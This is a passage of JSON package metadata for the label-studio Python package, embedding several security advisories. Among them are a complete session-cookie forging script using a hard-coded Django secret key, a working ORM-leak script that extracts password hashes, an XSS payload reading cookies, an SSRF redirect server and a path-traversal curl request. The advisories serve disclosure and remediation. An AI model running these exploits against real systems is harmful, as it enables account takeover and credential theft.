execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.0.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.0.post0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.19)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.0.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"3973805431a143d50cbdf91129dbb717ff5b601ce4ed3e73e12e92cac20b24f7","md5":"0d943ad1383b32c7160d022cca094341","sha256":"d7048e5d678467146b4a73fed1051896840344d2647a13df39a305a065403c6e"},"downloads":-1,"filename":"label_studio-0.8.0.post0-py3-none-any.whl","has_sig":false,"md5_digest":"0d943ad1383b32c7160d022cca094341","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":11072440,"upload_time":"2020-11-06T01:01:09","upload_time_iso_8601":"2020-11-06T01:01:09.658548Z","url":"https://files.pythonhosted.org/packages/39/73/805431a143d50cbdf91129dbb717ff5b601ce4ed3e73e12e92cac20b24f7/label_studio-0.8.0.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"778548de3cd8599a7d4b1df094a6d68dd4e749024ecd6fa91fe3f94f231456ca","md5":"d68f808e9402bdda3ea527b34822894d","sha256":"00e9133704e3941b72fc85d1c68fe54c156f7df3c0243b80ea26e9e64466bc77"},"downloads":-1,"filename":"label-studio-0.8.0.post0.tar.gz","has_sig":false,"md5_digest":"d68f808e9402bdda3ea527b34822894d","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":10973493,"upload_time":"2020-11-06T01:01:23","upload_time_iso_8601":"2020-11-06T01:01:23.370103Z","url":"https://files.pythonhosted.org/packages/77/85/48de3cd8599a7d4b1df094a6d68dd4e749024ecd6fa91fe3f94f231456ca/label-studio-0.8.0.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache 